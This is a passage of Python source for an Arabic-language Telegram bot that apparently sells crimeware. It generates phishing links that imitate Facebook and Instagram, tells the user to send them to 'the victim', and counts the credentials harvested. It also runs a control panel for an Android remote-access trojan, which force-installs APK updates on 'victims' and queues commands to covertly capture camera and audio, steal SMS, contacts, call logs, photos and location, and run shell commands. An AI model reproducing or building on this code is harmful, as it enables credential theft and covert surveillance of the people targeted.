    if data == "search_ig_soon":
        bot.answer_callback_query(call.id, "🚧 قريباً...", show_alert=True)
        safe_edit(
            call,
            "📷 <b>البحث بحساب انستقرام</b>\n\n"
            "🚧 <i>قيد التطوير</i>\n"
            "⏰ <i>سيتم إطلاقه قريباً</i>",
            reply_markup=build_search_menu()
        )
        return

    if data == "search_history":
        bot.answer_callback_query(call.id, "📜 جاري التحميل...")

        try:
            from imports_manager import get_user_phone_searches
            history = get_user_phone_searches(chat_id, limit=10)
        except Exception:
            history = []

        if not history:
            safe_edit(
                call,
                "📭 <b>لا يوجد سجل بحث</b>\n\n"
                "ابدأ بحثك الأول 👇",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("📱 بحث جديد", callback_data="search_phone"),
                    InlineKeyboardButton("🔙 رجوع", callback_data="search_menu")
                )
            )
            return

        lines = ["📋 <b>آخر 10 بحثات:</b>\n━━━━━━━━━━━━━━━━━━\n"]

        for i, item in enumerate(history, 1):
            phone = item.get('phone', '?')
            name = item.get('name', '')
            name_text = f" — {h(name)}" if name else ""
            lines.append(f"{i}. <code>{h(phone)}</code>{name_text}")

        m = InlineKeyboardMarkup()
        m.add(InlineKeyboardButton("📱 بحث جديد", callback_data="search_phone"))
        m.add(InlineKeyboardButton("🔙 رجوع", callback_data="search_menu"))

        safe_edit(call, "\n".join(lines), reply_markup=m)
        return

    # ============================================================
    # ★★★ الهندسة الاجتماعية ★★★
    # ============================================================
    try:
        from social_engineering import handle_social_engineering_callback
        if handle_social_engineering_callback(call, bot, chat_id, user_id, data):
            return
    except Exception as e:
        logger.exception(f"SE handler error: {e}")

    # ============================================================
    # Facebook Fake Sites
    # ============================================================
    if data == "gen_fb":
        check = can_use_tool(chat_id, "fb")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            safe_edit(
                call,
                _deny_message(check["reason"], chat_id, "fb", check),
                reply_markup=main_menu(user_id)
            )
            return

        bot.answer_callback_query(call.id)
        safe_edit(
            call,
            "📘 <b>مواقع فيسبوك المزيفة</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 <b>10 قوالب احترافية</b>\n"
            "كل قالب = موقع حقيقي بنسبة 95%\n\n"
            "💡 <i>اختر القالب المناسب للضحية</i>",
            reply_markup=build_facebook_sites_panel()
        )
        return

    if data.startswith("fb_site_"):
        template_key = data.replace("fb_site_", "")
        tpl = FACEBOOK_SITES.get(template_key)
        if not tpl:
            bot.answer_callback_query(call.id, "❌ القالب غير موجود", show_alert=True)
            return

        check = can_use_tool(chat_id, "fb")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            return

        bot.answer_callback_query(call.id, "🔄 جاري توليد الرابط...")
        consume_usage(chat_id, "fb")

        session_id = _create_fb_session(chat_id, template_key)
        if not session_id:
            safe_edit(
                call,
                "❌ فشل إنشاء الجلسة، حاول مرة أخرى",
                reply_markup=build_facebook_sites_panel()
            )
            return

        fake_link = f"{PUBLIC_URL}/fs/facebook/{template_key}?s={session_id}"

        text = (
            f"{tpl['emoji']} <b>{tpl['name']}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"📋 <b>وصف القالب:</b>\n"
            f"<i>{tpl['desc']}</i>\n\n"
            f"🎯 <b>الرابط الجاهز:</b>\n"
            f"<code>{fake_link}</code>\n\n"
            f"💡 <b>كيفية الاستخدام:</b>\n"
            f"• انسخ الرابط\n"
            f"• أرسله للضحية\n"
            f"• عندما تفتحه، ستظهر صفحة {tpl['name']}\n"
            f"• البوت سيستقبل البيانات فوراً"
        )

        m = InlineKeyboardMarkup()
        try:
            from telebot.types import CopyTextButton
            m.add(InlineKeyboardButton(
                "📋 نسخ الرابط",
                copy_text=CopyTextButton(text=fake_link)
            ))
        except Exception:
            pass

        m.row(
            InlineKeyboardButton("🔄 توليد جديد", callback_data=f"fb_site_{template_key}"),
            InlineKeyboardButton("📊 الإحصائيات", callback_data=f"fb_stats_{template_key}"),
        )
        m.add(InlineKeyboardButton("🔙 رجوع للقوالب", callback_data="gen_fb"))

        safe_edit(call, text, reply_markup=m)
        logger.info(f"FB Fake Link generated: {template_key}")
        return

    if data.startswith("fb_stats_"):
        template_key = data.replace("fb_stats_", "")
        bot.answer_callback_query(call.id, "📊 جاري الحساب...")

        try:
            session_ids = []
            if redis_client:
                session_ids = redis_client.lrange(f"se_user_sessions:{chat_id}", 0, 499) or []

            total = accessed = collected = 0
            for sid in session_ids:
                try:
                    raw = redis_client.get(f"se_session:{sid}")
                    if not raw:
                        continue
                    sdata = json.loads(raw)
                    if sdata.get('template') != template_key:
                        continue
                    total += 1
                    if sdata.get('accessed'):
                        accessed += 1
                    if sdata.get('collected'):
                        collected += 1
                except Exception:
                    continue

            tpl = FACEBOOK_SITES.get(template_key, {})
            rate = (collected / total * 100) if total > 0 else 0

            text = (
                f"📊 <b>إحصائيات {tpl.get('name', template_key)}</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                f"🔗 <b>إجمالي اللينكات:</b> <code>{total}</code>\n"
                f"👁️ <b>تم فتحها:</b> <code>{accessed}</code>\n"
                f"✅ <b>جمعت بيانات:</b> <code>{collected}</code>\n"
                f"📈 <b>نسبة النجاح:</b> <code>{rate:.1f}%</code>\n"
            )
        except Exception as e:
            logger.exception(f"fb_stats error: {e}")
            text = f"❌ خطأ: {h(str(e)[:200])}"

        m = InlineKeyboardMarkup()
        m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"fb_site_{template_key}"))
        safe_edit(call, text, reply_markup=m)
        return

    # ============================================================
    # Instagram Fake Sites
    # ============================================================
    if data == "gen_ig":
        check = can_use_tool(chat_id, "ig")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            safe_edit(
                call,
                _deny_message(check["reason"], chat_id, "ig", check),
                reply_markup=main_menu(user_id)
            )
            return

        bot.answer_callback_query(call.id)
        safe_edit(
            call,
            "📸 <b>مواقع Instagram المزيفة</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 <b>10 قوالب احترافية</b>\n"
            "كل قالب = موقع حقيقي بنسبة 95%\n\n"
            "💡 <i>اختر القالب المناسب للضحية</i>",
            reply_markup=build_instagram_sites_panel()
        )
        return

    if data.startswith("ig_site_"):
        template_key = data.replace("ig_site_", "")
        tpl = INSTAGRAM_SITES.get(template_key)
        if not tpl:
            bot.answer_callback_query(call.id, "❌ القالب غير موجود", show_alert=True)
            return

        check = can_use_tool(chat_id, "ig")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            return

        bot.answer_callback_query(call.id, "🔄 جاري توليد الرابط...")
        consume_usage(chat_id, "ig")

        session_id = _create_ig_session(chat_id, template_key)
        if not session_id:
            safe_edit(
                call,
                "❌ فشل إنشاء الجلسة، حاول مرة أخرى",
                reply_markup=build_instagram_sites_panel()
            )
            return

        fake_link = f"{PUBLIC_URL}/fs/instagram/{template_key}?s={session_id}"

        text = (
            f"{tpl['emoji']} <b>{tpl['name']}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"📋 <b>وصف القالب:</b>\n"
            f"<i>{tpl['desc']}</i>\n\n"
            f"🎯 <b>الرابط الجاهز:</b>\n"
            f"<code>{fake_link}</code>\n\n"
            f"💡 <b>كيفية الاستخدام:</b>\n"
            f"• انسخ الرابط\n"
            f"• أرسله للضحية\n"
            f"• عندما تفتحه، ستظهر صفحة {tpl['name']}\n"
            f"• البوت سيستقبل البيانات فوراً"
        )

        m = InlineKeyboardMarkup()
        try:
            from telebot.types import CopyTextButton
            m.add(InlineKeyboardButton(
                "📋 نسخ الرابط",
                copy_text=CopyTextButton(text=fake_link)
            ))
        except Exception:
            pass

        m.row(
            InlineKeyboardButton("🔄 توليد جديد", callback_data=f"ig_site_{template_key}"),
            InlineKeyboardButton("📊 الإحصائيات", callback_data=f"ig_stats_{template_key}"),
        )
        m.add(InlineKeyboardButton("🔙 رجوع للقوالب", callback_data="gen_ig"))

        safe_edit(call, text, reply_markup=m)
        logger.info(f"IG Fake Link generated: {template_key}")
        return

    if data.startswith("ig_stats_"):
        template_key = data.replace("ig_stats_", "")
        bot.answer_callback_query(call.id, "📊 جاري الحساب...")

        try:
            session_ids = []
            if redis_client:
                session_ids = redis_client.lrange(f"se_user_sessions:{chat_id}", 0, 499) or []

            total = accessed = collected = 0
            for sid in session_ids:
                try:
                    raw = redis_client.get(f"se_session:{sid}")
                    if not raw:
                        continue
                    sdata = json.loads(raw)
                    if sdata.get('template') != template_key:
                        continue
                    total += 1
                    if sdata.get('accessed'):
                        accessed += 1
                    if sdata.get('collected'):
                        collected += 1
                except Exception:
                    continue

            tpl = INSTAGRAM_SITES.get(template_key, {})
            rate = (collected / total * 100) if total > 0 else 0

            text = (
                f"📊 <b>إحصائيات {tpl.get('name', template_key)}</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                f"🔗 <b>إجمالي اللينكات:</b> <code>{total}</code>\n"
                f"👁️ <b>تم فتحها:</b> <code>{accessed}</code>\n"
                f"✅ <b>جمعت بيانات:</b> <code>{collected}</code>\n"
                f"📈 <b>نسبة النجاح:</b> <code>{rate:.1f}%</code>\n"
            )
        except Exception as e:
            logger.exception(f"ig_stats error: {e}")
            text = f"❌ خطأ: {h(str(e)[:200])}"

        m = InlineKeyboardMarkup()
        m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"ig_site_{template_key}"))
        safe_edit(call, text, reply_markup=m)
        return

    # ============================================================
    # Silent Collector
    # ============================================================
    if data == "gen_silent":
        check = can_use_tool(chat_id, "silent")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            safe_edit(
                call,
                _deny_message(check["reason"], chat_id, "silent", check),
                reply_markup=main_menu(user_id)
            )
            return
        consume_usage(chat_id, "silent")
        bot.answer_callback_query(call.id)

        msg = bot.send_message(
            chat_id,
            "🎯 <b>جمع المعلومات</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "أرسل <b>اسم/وصف</b> للضحية\n"
            "مثال: <code>أحمد</code> أو <code>زميل الشغل</code>\n\n"
            "⏱️ الرابط صالح 30 يوم",
            parse_mode="HTML"
        )
        bot.register_next_step_handler(msg, silent_label_handler)
        return

    if data == "silent_new":
        check = can_use_tool(chat_id, "silent")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            safe_edit(
                call,
                _deny_message(check["reason"], chat_id, "silent", check),
                reply_markup=main_menu(user_id)
            )
            return
        consume_usage(chat_id, "silent")
        bot.answer_callback_query(call.id)

        msg = bot.send_message(
            chat_id,
            "🎯 <b>لينك جديد</b>\n\nأرسل <b>اسم/وصف</b>:",
            parse_mode="HTML"
        )
        bot.register_next_step_handler(msg, silent_label_handler)
        return

    if data == "silent_stats":
        bot.answer_callback_query(call.id, "📊 جاري الحساب...")
        try:
            sessions = get_user_silent_sessions(user_id, limit=200) or []
            total = len(sessions)
            accessed = sum(1 for s in sessions if s.get('accessed'))
            collected = sum(1 for s in sessions if s.get('collected'))
            text = (
                "📊 <b>إحصائيات Silent Collector</b>\n"
                "━━━━━━━━━━━━━━━━━━\n\n"
                f"🔗 <b>إجمالي اللينكات:</b> <code>{total}</code>\n"
                f"👁️ <b>تم فتحها:</b> <code>{accessed}</code>\n"
                f"✅ <b>جمعت بيانات:</b> <code>{collected}</code>\n"
            )
            if total > 0:
                rate = (collected / total) * 100
                text += f"📈 <b>نسبة النجاح:</b> <code>{rate:.1f}%</code>\n"
        except Exception as e:
            logger.exception(f"silent_stats error: {e}")
            text = f"❌ خطأ: {h(str(e)[:200])}"
        safe_edit(call, text, reply_markup=silent_collector_panel())
        return

    if data == "silent_recent":
        bot.answer_callback_query(call.id, "📋 جاري التحميل...")
        try:
            sessions = get_user_silent_sessions(user_id, limit=10) or []
            if not sessions:
                safe_edit(
                    call,
                    "📭 <b>لا يوجد لينكات بعد</b>",
                    reply_markup=silent_collector_panel()
                )
                return
            lines = ["📋 <b>آخر 10 لينكات</b>\n━━━━━━━━━━━━━━━━━━\n"]
            for s in sessions[:10]:
                sid = s.get('session_id', '?')[:12]
                label = s.get('label', '')
                accessed = s.get('accessed', False)
                collected = s.get('collected', False)
                icon = "✅" if collected else ("👁️" if accessed else "⏳")
                label_text = f" — {h(label)}" if label else ""
                lines.append(f"{icon} <code>{h(sid)}</code>{label_text}")
            safe_edit(call, "\n".join(lines), reply_markup=silent_collector_panel())
        except Exception as e:
            logger.exception(f"silent_recent error: {e}")
            safe_edit(call, f"❌ خطأ: {h(str(e)[:200])}",
                      reply_markup=silent_collector_panel())
        return

    # ============================================================
    # فتح Dashboard
    # ============================================================
    if data == "open_dashboard":
        bot.answer_callback_query(call.id, "🔄 جاري تجهيز الرابط...")
        try:
            from web_dashboard import generate_magic_link
            link = generate_magic_link(user_id)
            if not link:
                safe_edit(call, "❌ فشل توليد الرابط، حاول مرة أخرى",
                          reply_markup=main_menu(user_id))
                return
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🚀 ادخل لوحة التحكم", url=link))
            markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_edit(
                call,
                "🔐 <b>رابط الدخول للوحة التحكم</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "⏰ <i>الرابط صالح لمدة 5 دقائق فقط</i>\n"
                "🛡️ <i>لا تشاركه مع أي شخص</i>",
                reply_markup=markup
            )
        except Exception as e:
            logger.exception(f"open_dashboard error: {e}")
            safe_edit(call, f"❌ خطأ: {h(str(e)[:100])}",
                      reply_markup=main_menu(user_id))
        return

    # ============================================================
    # أوامر التحديث (upd_)
    # ============================================================
    if data == "upd_status":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ للأدمن فقط", show_alert=True)
            return
        bot.answer_callback_query(call.id, "📊 جاري القراءة...")
        text = get_update_status_text()
        safe_edit(call, text, reply_markup=build_update_panel())
        return

    if data == "upd_check_release":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        bot.answer_callback_query(call.id, "🔍 جاري الفحص...")
        try:
            latest = _find_latest_apk_release()
            if latest:
                text = (
                    "🔍 <b>آخر Release على GitHub</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n\n"
                    f"📦 <b>الاسم:</b> <code>{h(latest.get('name', '?'))}</code>\n"
                    f"🏷️ <b>الإصدار:</b> <code>{h(latest.get('version_name', '?'))}</code>\n"
                    f"💾 <b>الحجم:</b> <code>{latest.get('size', 0) / 1024 / 1024:.2f} MB</code>\n"
                    f"📅 <b>التاريخ:</b> <code>{h(latest.get('published_at', '?'))}</code>\n"
                )
            else:
                text = "❌ <b>لا يوجد APK على GitHub Releases</b>"
        except Exception as e:
            logger.exception(f"upd_check_release error: {e}")
            text = f"❌ خطأ: {h(str(e)[:200])}"
        safe_edit(call, text, reply_markup=build_update_panel())
        return

    if data == "upd_force_all":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        m = InlineKeyboardMarkup()
        m.row(
            InlineKeyboardButton("✅ نعم، شغّل التحديث الشامل", callback_data="upd_force_all_confirm"),
            InlineKeyboardButton("❌ إلغاء", callback_data="upd_status"),
        )
        bot.answer_callback_query(call.id)
        safe_edit(
            call,
            "⚠️ <b>تأكيد التحديث الشامل</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "🚨 هذا الأمر سيجبر <b>كل الضحايا المتصلين</b> على:\n"
            "• فحص وجود تحديث فوراً\n"
            "• تحميل التحديث الجديد\n"
            "• تثبيته تلقائياً\n\n"
            "هل أنت متأكد؟",
            reply_markup=m
        )
        return

    if data == "upd_force_all_confirm":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        bot.answer_callback_query(call.id, "🚀 جاري التنفيذ...")
        try:
            if redis_client:
                redis_client.setex("apk_force_update", 3600, str(int(time.time())))
                victims = 0
                try:
                    victims = len(redis_client.keys("victim:*") or [])
                except Exception:
                    pass
                text = (
                    "✅ <b>تم تفعيل التحديث الشامل</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n\n"
                    f"👥 <b>الضحايا المتأثرون:</b> ~<code>{victims}</code>\n"
                    f"⏰ <b>المدة:</b> ساعة واحدة\n"
                )
            else:
                text = "❌ Redis غير متصل"
        except Exception as e:
            logger.exception(f"upd_force_all_confirm error: {e}")
            text = f"❌ خطأ: {h(str(e)[:200])}"
        safe_edit(call, text, reply_markup=build_update_panel())
        return

    if data == "upd_target":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(
            chat_id,
            "🎯 <b>تحديث ضحية محددة</b>\n\n"
            "أرسل <b>Victim Token</b> أو <b>Device ID</b>",
            parse_mode="HTML"
        )
        bot.register_next_step_handler(msg, upd_target_handler)
        return

    if data == "upd_clear_cache":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        bot.answer_callback_query(call.id, "♻️ جاري المسح...")
        try:
            if redis_client:
                redis_client.delete("apk_current_info")
                import os
                import shutil
                cache_dir = os.getenv("APK_CACHE_DIR", "/tmp/apk_cache")
                if os.path.exists(cache_dir):
                    try:
                        shutil.rmtree(cache_dir)
                        os.makedirs(cache_dir, exist_ok=True)
                    except Exception:
                        pass
            safe_edit(call, "✅ <b>تم مسح Cache</b>", reply_markup=build_update_panel())
        except Exception as e:
            logger.exception(f"upd_clear_cache error: {e}")
            safe_edit(call, f"❌ {h(str(e)[:200])}", reply_markup=build_update_panel())
        return

    if data == "upd_history":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        bot.answer_callback_query(call.id, "📜 جاري القراءة...")
        try:
            if not redis_client:
                safe_edit(call, "❌ Redis غير متصل", reply_markup=build_update_panel())
                return
            history_raw = redis_client.lrange("update_history", 0, 19) or []
            if not history_raw:
                text = "📜 <b>سجل التحديثات</b>\n\n<i>لا يوجد سجل بعد</i>"
            else:
                lines = ["📜 <b>آخر 20 تحديث</b>\n━━━━━━━━━━━━━━━━━━"]
                for item in history_raw:
                    try:
                        entry = json.loads(item) if isinstance(item, str) else item
                        status = entry.get("status", "?")
                        token = entry.get("token", "?")[:12]
                        ts = entry.get("time_str", "?")
                        icon = "✅" if status == "success" else "❌"
                        lines.append(f"{icon} <code>{h(token)}</code> — {h(ts)}")
                    except Exception:
                        continue
                text = "\n".join(lines)
        except Exception as e:
            logger.exception(f"upd_history error: {e}")
            text = f"❌ {h(str(e)[:200])}"
        safe_edit(call, text, reply_markup=build_update_panel())
        return

    if data == "upd_settings":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        try:
            from apk_updater import CURRENT_VERSION_CODE, CURRENT_VERSION_NAME
            text = (
                "⚙️ <b>إعدادات التحديث</b>\n"
                "━━━━━━━━━━━━━━━━━━\n\n"
                "📌 <b>السيرفر:</b>\n"
                f"  • النسخة: <code>{CURRENT_VERSION_NAME}</code>\n"
                f"  • الكود: <code>{CURRENT_VERSION_CODE}</code>\n"
            )
        except Exception as e:
            text = f"❌ {h(str(e)[:200])}"
        safe_edit(call, text, reply_markup=build_update_panel())
        return

    # ============================================================
    # قائمة الضحايا
    # ============================================================
    if data == "v_list":
        bot.answer_callback_query(call.id)
        victims = get_all_victims(chat_id)
        m = InlineKeyboardMarkup()
        m.add(InlineKeyboardButton("➕ ضحية جديدة (APK)", callback_data="v_new"))
        m.add(InlineKeyboardButton("🌐 فتح لوحة التحكم (ويب)", callback_data="open_dashboard"))
        if victims:
            m.add(InlineKeyboardButton(
                f"━━━ 📋 ضحاياي ({len(victims)}) ━━━",
                callback_data="noop"
            ))
            for v in victims[:15]:
                vid = v.get("victim_id", "")
                name = v.get("name", "?")[:18]
                status = v.get("status", "pending")
                icon = "🟢" if status == "active" else "⏸️"
                m.add(InlineKeyboardButton(f"{icon} {name}", callback_data=f"v_open_{vid}"))
        m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main"))
        text = (
            f"👥 <b>إدارة الضحايا</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>العدد:</b> <code>{len(victims)}</code>\n\n"
        )
        if not victims:
            text += "📭 <b>لا يوجد ضحايا بعد</b>\n\n💡 اضغط <b>➕ ضحية جديدة</b>"
        else:
            text += "👇 اختر ضحية للتحكم بها"
        safe_edit(call, text, reply_markup=m)
        return

    if data == "v_new":
        bot.answer_callback_query(call.id)
        check = can_use_tool(chat_id, "apk")
        if not check["allowed"]:
            safe_edit(call, "❌ لا يوجد رصيد. اشترك أولاً.",
                      reply_markup=build_main_payment_keyboard())
            return
        consume_usage(chat_id, "apk")
        msg = bot.send_message(
            chat_id,
            "📝 <b>إضافة ضحية جديدة</b>\n\n"
            "أرسل اسم الضحية (مثلاً: <code>أحمد</code>)",
            parse_mode="HTML"
        )
        bot.register_next_step_handler(msg, victim_name_step)
        return

    if data.startswith("v_open_"):
        victim_id = data.replace("v_open_", "")
        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌ غير موجودة", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        name = victim.get("name", "?")
        status = victim.get("status", "pending")
        device_id = victim.get("device_id", "—")
        model = victim.get("model", "—")
        android = victim.get("android", "—")
        brand = victim.get("brand", "—")
        last_seen = victim.get("last_seen")
        status_icon = "🟢 متصل" if status == "active" else "⏸️ في انتظار التثبيت"
        last_str = "—"
        if last_seen:
            try:
                diff = time.time() - float(last_seen)
                if diff < 60:
                    last_str = f"قبل {int(diff)} ثانية"
                elif diff < 3600:
                    last_str = f"قبل {int(diff/60)} دقيقة"
                elif diff < 86400:
                    last_str = f"قبل {int(diff/3600)} ساعة"
                else:
                    last_str = f"قبل {int(diff/86400)} يوم"
            except Exception:
                pass
        text = (
            f"👤 <b>{h(name)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 الحالة: {status_icon}\n"
            f"📱 الجهاز: <code>{h(brand)} {h(model)}</code>\n"
            f"🤖 Android: <code>{h(android)}</code>\n"
            f"🆔 Device: <code>{h(device_id[:16]) if device_id else '—'}</code>\n"
            f"🕐 آخر ظهور: {last_str}\n\n"
            f"🎛️ <b>اختر الأمر:</b>"
        )
        safe_edit(call, text, reply_markup=victim_commands_panel(victim_id))
        return

    # ============================================================
    # أوامر الضحية (vcmd_)
    # ============================================================
    if data.startswith("vcmd_"):
        body = data.replace("vcmd_", "")
        parts = body.split("_")
        victim_id = parts[-1]
        action = "_".join(parts[:-1])
        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌ ضحية غير موجودة", show_alert=True)
            return

        action_map = {
            "camfront": "camera_front",
            "camback": "camera_back",
            "videofront": "camera_record_front",
            "videoback": "camera_record_back",
            "video": "camera_record",
            "audio": "record_audio",
            "sound": "play_sound",
            "alarm": "play_alarm",
            "info": "get_device_info",
            "battery": "get_battery",
            "sms": "get_sms",
            "calls": "get_call_log",
            "contacts": "get_contacts",
            "apps": "get_apps",
            "photos": "get_photos",
            "videos": "get_videos",
            "location": "get_location",
            "wifi": "get_wifi_info",
            "clipboard": "get_clipboard",
            "vibrate": "vibrate",
            "volmax": "volume_max",
            "lock": "lock_screen",
            "home": "show_home",
            "screenoff": "screen_off",
            "mediaplay": "media_play_pause",
            "medianext": "media_next",
            "mediaprev": "media_previous",
        }

        if action == "volmute":
            ok = queue_victim_command(victim_id, "volume_set", level=0, stream="music")
            bot.answer_callback_query(call.id, "🔉 تم خفض الصوت" if ok else "❌ فشل",
                                       show_alert=not ok)
            return

        if action == "volmid":
            ok = queue_victim_command(victim_id, "volume_set", level=8, stream="music")
            bot.answer_callback_query(call.id, "🔉 تم ضبط الصوت" if ok else "❌ فشل",
                                       show_alert=not ok)
            return

        if action in action_map:
            real_action = action_map[action]
            kwargs = {}
            if action in ("video", "videofront", "videoback"):
                kwargs["duration"] = 10000
            elif action == "audio":
                kwargs["duration"] = 10000
            elif action == "vibrate":
                kwargs["ms"] = 3000
            ok = queue_victim_command(victim_id, real_action, **kwargs)
            bot.answer_callback_query(call.id,
                                       "✅ تم الإرسال" if ok else "❌ فشل",
                                       show_alert=not ok)
            return

        if action == "toast":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "💬 <b>أرسل النص:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: v_toast_step(m, victim_id))
            return

        if action == "shell":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "💻 <b>أرسل الأمر:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: v_shell_step(m, victim_id))
            return

        if action == "sendsms":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id,
                "✉️ <b>أرسل:</b> <code>رقم|نص</code>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: v_sendsms_step(m, victim_id))
            return

        if action == "call":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "📞 <b>أرسل الرقم:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: v_call_step(m, victim_id))
            return

        if action == "url":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "🌐 <b>أرسل الرابط:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: v_url_step(m, victim_id))
            return

        bot.answer_callback_query(call.id, f"❓ {action}", show_alert=True)
        return

    # ============================================================
    # أوامر APK Manager (apk_cmd_)
    # ============================================================
    if data.startswith("apk_cmd_"):
        body = data.replace("apk_cmd_", "")
        parts = body.rsplit("_", 1)
        if len(parts) != 2:
            bot.answer_callback_query(call.id, "❌ صيغة خاطئة", show_alert=True)
            return
        action_key, device_id = parts

        apk_action_map = {
            "camera_front": "camera_front",
            "camera_back": "camera_back",
            "camera_record_front": "camera_record_front",
            "camera_record_back": "camera_record_back",
            "record_audio": "record_audio",
            "play_sound": "play_sound",
            "play_alarm": "play_alarm",
            "info": "get_device_info",
            "battery": "get_battery",
            "sms": "get_sms",
            "calls": "get_call_log",
            "contacts": "get_contacts",
            "apps": "get_apps",
            "photos": "get_photos",
            "videos": "get_videos",
            "location": "get_location",
            "wifi": "get_wifi_info",
            "clipboard": "get_clipboard",
            "vibrate": "vibrate",
            "volume_max": "volume_max",
            "lock_screen": "lock_screen",
            "show_home": "show_home",
            "screen_off": "screen_off",
            "media_play": "media_play_pause",
            "media_next": "media_next",
            "media_prev": "media_previous",
            "shell": "shell",
        }

        if action_key == "volume_mute":
            ok = push_apk_command(device_id, "volume_set", level=0, stream="music")
            bot.answer_callback_query(call.id, "🔉" if ok else "❌", show_alert=not ok)
            return

        if action_key == "volume_mid":
            ok = push_apk_command(device_id, "volume_set", level=8, stream="music")
            bot.answer_callback_query(call.id, "⚡" if ok else "❌", show_alert=not ok)
            return

        if action_key == "toast":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "💬 <b>أرسل النص:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: apk_toast_step(m, device_id))
            return

        if action_key == "shell":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "💻 <b>أرسل الأمر:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: apk_shell_step(m, device_id))
            return

        if action_key == "send_sms":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id,
                "✉️ <b>أرسل:</b> <code>رقم|نص</code>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: apk_sendsms_step(m, device_id))
            return

        if action_key == "call":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "📞 <b>أرسل الرقم:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: apk_call_step(m, device_id))
            return

        if action_key == "open_url":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "🌐 <b>أرسل الرابط:</b>", parse_mode="HTML")
            bot.register_next_step_handler(msg, lambda m: apk_url_step(m, device_id))
            return

        if action_key in apk_action_map:
            real_action = apk_action_map[action_key]
            kwargs = {}
            if "camera_record" in action_key:
                kwargs["duration"] = 10000
            elif action_key == "record_audio":
                kwargs["duration"] = 10000
            elif action_key == "vibrate":
                kwargs["ms"] = 3000
            ok = push_apk_command(device_id, real_action, **kwargs)
            bot.answer_callback_query(call.id, "✅" if ok else "❌", show_alert=not ok)
            return

        bot.answer_callback_query(call.id, f"❓ {action_key}", show_alert=True)
        return

    # ============================================================
    # تحديث / إعادة تسمية / حذف
    # ============================================================
    if data.startswith("v_refresh_"):
        victim_id = data.replace("v_refresh_", "")
        victim = get_victim(chat_id, victim_id)
        if victim:
            bot.answer_callback_query(call.id, "🔄 تم التحديث")
            safe_edit(call, f"👤 <b>{h(victim.get('name'))}</b>",
                      reply_markup=victim_commands_panel(victim_id))
        return

    if data.startswith("v_rename_"):
        victim_id = data.replace("v_rename_", "")
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "✏️ <b>أرسل الاسم الجديد:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, lambda m: v_rename_step(m, victim_id))
        return

    if data.startswith("v_delete_"):
        victim_id = data.replace("v_delete_", "")
        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        m = InlineKeyboardMarkup()
        m.row(
